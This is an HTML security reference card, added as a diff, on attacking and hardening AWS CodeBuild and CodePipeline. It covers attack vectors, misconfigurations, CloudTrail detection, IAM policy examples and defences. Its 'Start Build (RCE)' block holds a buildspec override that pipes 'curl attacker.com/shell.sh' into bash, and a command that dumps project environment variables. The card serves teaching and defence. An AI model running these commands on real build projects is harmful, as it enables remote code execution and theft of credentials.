@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AWS CodeBuild &amp; CodePipeline | AWS Security Cards</title>
+<meta name="description" content="CodeBuild and CodePipeline are AWS's CI/CD services for building, testing, and deploying applications. Attackers exploit build environments for code execution, credential theft from environment variables, and supply chain attacks through compromised build artifacts.">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+    background: #0a0e1a;
+    color: #e2e8f0;
+    line-height: 1.6;
+    padding: 2rem;
+    max-width: 1200px;
+    margin: 0 auto;
+  }
+  a { color: #22d3ee; text-decoration: none; }
+  a:hover { text-decoration: underline; }
+
+  /* Card Image */
+  .card-image {
+    border-radius: 1rem;
+    overflow: hidden;
+    margin-bottom: 2rem;
+    border: 1px solid rgba(255,255,255,0.1);
+  }
+  .card-image img {
+    width: 100%;
+    height: auto;
+    display: block;
+  }
+
+  /* Header */
+  .header {
+    position: relative;
+    overflow: hidden;
+    border-radius: 1rem;
+    background: linear-gradient(135deg, #06b6d415, #0a0e1a, #0ea5e915);
+    border: 1px solid #06b6d44d;
+    padding: 2.5rem;
+    margin-bottom: 2rem;
+  }
+  .header::before {
+    content: '';
+    position: absolute;
+    top: 0; right: 0;
+    width: 24rem; height: 24rem;
+    background: #06b6d40d;
+    border-radius: 50%;
+    filter: blur(3rem);
+  }
+  .header-content { position: relative; display: flex; align-items: flex-start; gap: 1.5rem; }
+  .header-icon { width: 64px; height: 64px; flex-shrink: 0; }
+  .header-icon img { width: 100%; height: 100%; }
+  .header-title { font-size: 1.875rem; font-weight: 700; color: #fff; }
+  .header-badge {
+    display: inline-block;
+    padding: 0.25rem 0.75rem;
+    background: #06b6d433;
+    color: #06b6d4;
+    font-size: 0.8rem;
+    font-weight: 600;
+    border-radius: 999px;
+    border: 1px solid #06b6d44d;
+    margin-left: 0.75rem;
+    vertical-align: middle;
+  }
+  .header-desc { color: #94a3b8; max-width: 42rem; margin-top: 0.5rem; }
+
+  /* Stats */
+  .stats-row { display: grid; grid-template-columns: repeat(4, 1fr); gap: 1rem; margin-bottom: 2rem; }
+  .stat-card {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1rem;
+    text-align: center;
+  }
+  .stat-value { font-size: 1.5rem; font-weight: 700; }
+  .stat-label { font-size: 0.8rem; color: #94a3b8; }
+
+  /* Sections */
+  .section {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.75rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1.5rem;
+    margin-bottom: 1.5rem;
+  }
+  .section h2 {
+    font-size: 1.25rem;
+    font-weight: 700;
+    color: #fff;
+    margin-bottom: 1rem;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+  }
+
+  /* Overview */
+  .overview-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+  .overview-grid h4 { font-size: 0.9rem; font-weight: 600; margin-bottom: 0.5rem; }
+  .overview-grid p { font-size: 0.875rem; color: #94a3b8; margin-bottom: 0.75rem; }
+  .attack-note {
+    background: rgba(0,0,0,0.3);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 0.75rem;
+    font-size: 0.875rem;
+    color: #cbd5e1;
+  }
+
+  /* Risk Gauge */
+  .risk-gauge { display: flex; align-items: center; gap: 2rem; }
+  .risk-bar-container { flex: 1; }
+  .risk-bar {
+    height: 1rem;
+    background: #0f172a;
+    border-radius: 999px;
+    overflow: hidden;
+  }
+  .risk-bar-fill {
+    height: 100%;
+    border-radius: 999px;
+    background: linear-gradient(90deg, #eab308, #f97316, #ef4444);
+  }
+  .risk-labels { display: flex; justify-content: space-between; font-size: 0.8rem; color: #94a3b8; margin-top: 0.5rem; }
+  .risk-score { text-align: center; }
+  .risk-score-value { font-size: 2.5rem; font-weight: 700; color: #f87171; }
+  .risk-score-label { font-size: 0.8rem; color: #94a3b8; }
+  .risk-desc { margin-top: 1rem; font-size: 0.875rem; color: #94a3b8; }
+
+  /* Panels Grid */
+  .panels-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1.5rem; margin-bottom: 1.5rem; }
+  @media (max-width: 1024px) { .panels-grid { grid-template-columns: repeat(2, 1fr); } }
+  @media (max-width: 640px) { .panels-grid, .stats-row, .overview-grid { grid-template-columns: 1fr; } }
+  .panel {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.75rem;
+    border: 1px solid;
+    padding: 1.5rem;
+  }
+  .panel h3 { font-size: 1.1rem; font-weight: 700; margin-bottom: 1rem; display: flex; align-items: center; gap: 0.5rem; }
+  .panel h4 { font-size: 0.85rem; font-weight: 600; margin-bottom: 0.5rem; margin-top: 1rem; }
+  .panel ul { list-style: none; padding: 0; }
+  .panel li {
+    font-size: 0.85rem;
+    color: #cbd5e1;
+    padding: 0.15rem 0;
+    display: flex;
+    align-items: flex-start;
+    gap: 0.5rem;
+  }
+  .bullet { margin-top: 0.15rem; }
+  .note {
+    margin-top: 1rem;
+    padding: 0.75rem;
+    border-radius: 0.5rem;
+    font-size: 0.85rem;
+  }
+
+  /* Commands */
+  .cmd-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+  .cmd-block { margin-top: 0.75rem; }
+  .cmd-title { font-size: 0.8rem; color: #94a3b8; margin-bottom: 0.25rem; }
+  pre {
+    background: rgba(0,0,0,0.5);
+    border-radius: 0.5rem;
+    padding: 0.75rem;
+    font-size: 0.8rem;
+    color: #4ade80;
+    overflow-x: auto;
+    border: 1px solid rgba(255,255,255,0.06);
+    white-space: pre-wrap;
+    word-break: break-all;
+    font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', monospace;
+  }
+
+  /* Policies */
+  .policy-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+  .policy-card {
+    border-radius: 0.5rem;
+    border: 1px solid;
+    padding: 1rem;
+  }
+  .policy-header { display: flex; align-items: center; gap: 0.5rem; margin-bottom: 0.75rem; font-size: 0.9rem; }
+  .policy-card pre { margin-bottom: 0.75rem; color: #cbd5e1; }
+  .policy-desc { font-size: 0.8rem; color: #94a3b8; }
+
+  /* Defenses */
+  .defense-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+  .defense-card {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1rem;
+  }
+  .defense-card:hover { border-color: #22d3ee4d; }
+  .defense-header { display: flex; align-items: flex-start; gap: 0.75rem; }
+  .defense-icon { font-size: 1.5rem; }
+  .defense-card h4 { font-size: 0.9rem; font-weight: 600; color: #fff; margin-bottom: 0.25rem; }
+  .defense-card p { font-size: 0.85rem; color: #94a3b8; margin-bottom: 0.5rem; }
+  .defense-card pre { color: #22d3ee; }
+
+  /* Footer */
+  .footer { text-align: center; padding: 1.5rem 0; font-size: 0.8rem; color: #64748b; }
+  .footer a { color: #22d3ee; }
+
+  /* Prevent ugly page-break splits */
+  .card-image,
+  .header,
+  .stat-card,
+  .stats-row,
+  .section,
+  .panel,
+  .cmd-block,
+  .policy-card,
+  .defense-card,
+  .attack-note,
+  .overview-grid > div,
+  .risk-gauge,
+  .note {
+    break-inside: avoid;
+    page-break-inside: avoid;
+  }
+  .section,
+  .panels-grid,
+  .card-image,
+  .header {
+    break-before: auto;
+    page-break-before: auto;
+  }
+  /* Keep headings with their content */
+  h2, h3, h4 {
+    break-after: avoid;
+    page-break-after: avoid;
+  }
+
+  @media print {
+    body { background: #0a0e1a; -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+    /* Switch panels to 2-col for better page flow */
+    .panels-grid { grid-template-columns: repeat(2, 1fr); }
+    /* Switch commands and policies to single column to avoid splits */
+    .cmd-grid { grid-template-columns: 1fr; }
+    .policy-grid { grid-template-columns: 1fr; }
+    .defense-grid { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<!-- Card Image -->
+<div class="card-image">
+  <img src="../images/codebuild-card.webp" alt="AWS CodeBuild &amp; CodePipeline" />
+</div>
+
+<!-- Header -->
+<div class="header">
+  <div class="header-content">
+    <div class="header-icon"><img src="../icons/codebuild.svg" alt="AWS CodeBuild &amp; CodePipeline" /></div>
+    <div>
+      <div>
+        <span class="header-title">AWS CodeBuild &amp; CodePipeline</span>
+        <span class="header-badge">CI/CD</span>
+      </div>
+      <p class="header-desc">CodeBuild and CodePipeline are AWS's CI/CD services for building, testing, and deploying applications. Attackers exploit build environments for code execution, credential theft from environment variables, and supply chain attacks through compromised build artifacts.</p>
+    </div>
+  </div>
+</div>
+
+<!-- Stats -->
+<div class="stats-row">
+        <div class="stat-card">
+          <div class="stat-value" style="color: #f87171;">CRITICAL</div>
+          <div class="stat-label">Supply Chain Risk</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #4ade80;">RCE</div>
+          <div class="stat-label">Code Execution</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #60a5fa;">Secrets</div>
+          <div class="stat-label">Credential Exposure</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #c084fc;">Artifacts</div>
+          <div class="stat-label">Poisoning Target</div>
+        </div></div>
+
+<!-- Overview -->
+<div class="section"><h2><span style="color:#06b6d4;">&#x1F4CB;</span> Service Overview</h2><div class="overview-grid">
+        <div>
+          <h4 style="color: #06b6d4;">Build Projects &amp; Buildspecs</h4>
+          <p>CodeBuild projects define the build environment, source provider, and buildspec file that controls every build step. Buildspecs execute arbitrary shell commands with the project's IAM role permissions, making them a prime target for injecting malicious build steps.</p>
+          
+        </div>
+        <div>
+          <h4 style="color: #06b6d4;">Environment Variables &amp; Secrets</h4>
+          <p>Build projects store configuration as environment variables — often including database credentials, API keys, and tokens. Variables can reference Secrets Manager or SSM Parameter Store, but plaintext variables are visible to anyone with codebuild:BatchGetProjects permissions.</p>
+          
+        </div>
+        <div>
+          <h4 style="color: #06b6d4;">Artifacts &amp; Build Output</h4>
+          <p>Build artifacts are stored in S3 and may be deployed directly to production. A compromised build can inject backdoors into application packages, container images, or deployment bundles — creating supply chain attacks that propagate downstream.</p>
+          
+        </div></div></div>
+
+<!-- Risk Assessment -->
+
+<div class="section">
+  <h2>Security Risk Assessment</h2>
+  <div class="risk-gauge">
+    <div class="risk-bar-container">
+      <div class="risk-bar">
+        <div class="risk-bar-fill" style="width: 90%;"></div>
+      </div>
+      <div class="risk-labels"><span>Low</span><span>Medium</span><span>High</span><span>Critical</span></div>
+    </div>
+    <div class="risk-score">
+      <div class="risk-score-value">9.0</div>
+      <div class="risk-score-label">Risk Score</div>
+    </div>
+  </div>
+  <p class="risk-desc">CI/CD systems are prime targets for supply chain attacks. CodeBuild executes arbitrary code with powerful IAM roles. Environment variables often contain secrets. Compromised builds can poison production deployments.</p>
+</div>
+
+<!-- Main Panels -->
+<div class="panels-grid">
+      <div class="panel" style="border-color: #f8717133;">
+        <h3 style="color: #f87171;">⚔️ Attack Vectors</h3><h4 style="color: #f87171;">Build Exploitation</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Buildspec injection via StartBuild</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Environment variable theft</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Build role credential abuse</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Artifact poisoning/backdooring</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Source code manipulation</li></ul></div>
+      <div class="panel" style="border-color: #fb923c33;">
+        <h3 style="color: #fb923c;">⚠️ Misconfigurations</h3><h4 style="color: #fb923c;">Common Issues</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Secrets in PLAINTEXT env vars</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Overly permissive build roles</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> No buildspec override protection</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Unencrypted artifact stores</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Missing build isolation (VPC)</li></ul></div>
+      <div class="panel" style="border-color: #facc1533;">
+        <h3 style="color: #facc15;">💀 Exploitation</h3><h4 style="color: #facc15;">Techniques</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Inject reverse shell in buildspec</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Exfil credentials via curl</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Pivot using build service role</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Backdoor container images</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Modify deployment artifacts</li></ul></div>
+      <div class="panel" style="border-color: #c084fc33;">
+        <h3 style="color: #c084fc;">🔑 Credential Locations</h3><h4 style="color: #c084fc;">Secrets</h4><ul><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Environment variables (API)</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> AWS_ACCESS_KEY_ID/SECRET</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> IMDS role credentials</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Secrets Manager references</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Build logs (if verbose)</li></ul></div>
+      <div class="panel" style="border-color: #60a5fa33;">
+        <h3 style="color: #60a5fa;">🔗 Supply Chain Risks</h3><h4 style="color: #60a5fa;">Attack Surface</h4><ul><li><span class="bullet" style="color: #60a5fa;">&#x2022;</span> Compromised build images</li><li><span class="bullet" style="color: #60a5fa;">&#x2022;</span> Malicious dependencies</li><li><span class="bullet" style="color: #60a5fa;">&#x2022;</span> Poisoned artifacts to S3/ECR</li><li><span class="bullet" style="color: #60a5fa;">&#x2022;</span> Backdoored containers</li><li><span class="bullet" style="color: #60a5fa;">&#x2022;</span> Modified deployment configs</li></ul></div>
+      <div class="panel" style="border-color: #4ade8033;">
+        <h3 style="color: #4ade80;">🛡️ Detection</h3><h4 style="color: #4ade80;">CloudTrail Events</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> StartBuild (with override)</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> UpdateProject</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> BatchGetProjects (enum)</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> UpdatePipeline</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> ImportSourceCredentials</li></ul>
+        <div class="cmd-block">
+          <div class="cmd-title">List Build Projects</div>
+          <pre><code>aws codebuild list-projects</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Get Project Details</div>
+          <pre><code>aws codebuild batch-get-projects --names my-project</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">List Builds for Project</div>
+          <pre><code>aws codebuild list-builds-for-project --project-name my-project</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Get Build Details</div>
+          <pre><code>aws codebuild batch-get-builds --ids my-project:build-id</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">List Pipelines</div>
+          <pre><code>aws codepipeline list-pipelines</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Get Pipeline Details</div>
+          <pre><code>aws codepipeline get-pipeline --name my-pipeline</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Get Environment Variables</div>
+          <pre><code>aws codebuild batch-get-projects --names my-project --query 'projects[].environment.environmentVariables'</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">List Source Credentials</div>
+          <pre><code>aws codebuild list-source-credentials</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Start Build (RCE)</div>
+          <pre><code>aws codebuild start-build --project-name my-project --buildspec-override &quot;version: 0.2\
+phases:\
+  build:\
+    commands:\
+      - curl attacker.com/shell.sh | bash&quot;</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Get Build Logs</div>
+          <pre><code>aws logs get-log-events --log-group-name /aws/codebuild/my-project --log-stream-name build-id</code></pre>
+        </div></div></div>
+
+<!-- Exploitation -->
+
+
+<!-- Policies -->
+<div class="section"><h2><span style="color:#4ade80;">&#x1F4DC;</span> Policy Examples</h2><div class="policy-grid">
+        <div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
+          <div class="policy-header">
+            <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
+            <span style="color: #f87171; font-weight: 600;">Dangerous - Overly Permissive Build Role</span>
+          </div>
+          <pre><code>{
+  &quot;Effect&quot;: &quot;Allow&quot;,
+  &quot;Action&quot;: &quot;*&quot;,
+  &quot;Resource&quot;: &quot;*&quot;
+}
+
+// Build role with full access enables:
+// - Access any S3 bucket
+// - Read all secrets
+// - Assume other roles</code></pre>
+          <p class="policy-desc">Build role with broad access enables lateral movement to any AWS resource</p>
+        </div>
+        <div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
+          <div class="policy-header">
+            <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
+            <span style="color: #4ade80; font-weight: 600;">Secure - Scoped Build Role</span>
+          </div>
+          <pre><code>{
+  &quot;Effect&quot;: &quot;Allow&quot;,
+  &quot;Action&quot;: [
+    &quot;logs:CreateLogGroup&quot;,
+    &quot;logs:PutLogEvents&quot;
+  ],
+  &quot;Resource&quot;: &quot;arn:aws:logs:*:*:/aws/codebuild/*&quot;
+},
+{
+  &quot;Effect&quot;: &quot;Allow&quot;,
+  &quot;Action&quot;: &quot;s3:PutObject&quot;,
+  &quot;Resource&quot;: &quot;arn:aws:s3:::build-artifacts/*&quot;
+}</code></pre>
+          <p class="policy-desc">Limited to only required build operations - logs and artifact storage</p>
+        </div>
+        <div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
+          <div class="policy-header">
+            <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
+            <span style="color: #f87171; font-weight: 600;">Dangerous - StartBuild with Override</span>
+          </div>
+          <pre><code>{
+  &quot;Effect&quot;: &quot;Allow&quot;,
+  &quot;Action&quot;: [
+    &quot;codebuild:StartBuild&quot;,
+    &quot;codebuild:BatchGetProjects&quot;
+  ],
+  &quot;Resource&quot;: &quot;*&quot;
+}
+
+# Attacker can override buildspec with:
+# - Malicious commands
+# - Credential theft
+# - Reverse shells</code></pre>
+          <p class="policy-desc">Allows buildspec override for arbitrary code execution in build environment</p>
+        </div>
+        <div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
+          <div class="policy-header">
+            <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
+            <span style="color: #4ade80; font-weight: 600;">Secure - Block Buildspec Override</span>
+          </div>
+          <pre><code>{
+  &quot;Effect&quot;: &quot;Allow&quot;,
+  &quot;Action&quot;: &quot;codebuild:StartBuild&quot;,
+  &quot;Resource&quot;: &quot;arn:aws:codebuild:*:*:project/my-*&quot;,
+  &quot;Condition&quot;: {
+    &quot;Null&quot;: {
+      &quot;codebuild:BuildSpecOverride&quot;: &quot;true&quot;
+    }
+  }
+}
+
+// Cannot override buildspec - uses project config</code></pre>
+          <p class="policy-desc">Uses IAM condition to prevent buildspec override attacks</p>
+        </div></div></div>
+
+<!-- Defenses -->
+<div class="section"><h2><span style="color:#4ade80;">&#x1F6E1;&#xFE0F;</span> Defense Recommendations</h2><div class="defense-grid">
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🔑</span>
+            <div>
+              <h4>Use Secrets Manager References</h4>
+              <p>Never use PLAINTEXT environment variables - reference Secrets Manager instead.</p>
+              
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🚫</span>
+            <div>
+              <h4>Block Buildspec Override</h4>
+              <p>Use IAM conditions to prevent buildspec override in StartBuild calls.</p>
+              
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🔒</span>
+            <div>
+              <h4>Least Privilege Build Roles</h4>
+              <p>Scope build roles to minimum required permissions for the build.</p>
+              <pre><code>Only S3, ECR, and CloudWatch Logs for most builds</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🌐</span>
+            <div>
+              <h4>Enable VPC for Builds</h4>
+              <p>Run builds in VPC to control network access and prevent data exfiltration.</p>
+              
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">📝</span>
+            <div>
+              <h4>Sign Build Artifacts</h4>
+              <p>Sign build artifacts and verify signatures before deployment.</p>
+              <pre><code>Use AWS Signer or Cosign for container images</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">👁️</span>
+            <div>
+              <h4>Monitor Build Activity</h4>
+              <p>Alert on StartBuild with overrides, new projects, and credential access.</p>
+              
+            </div>
+          </div>
+        </div></div></div>
+
+<!-- Footer -->
+<div class="footer">
+  <p>AWS CodeBuild &amp; CodePipeline Card</p>
+  <p style="margin-top:0.25rem;">Always obtain proper authorization before testing</p>
+</div>
+
+</body>
+</html>
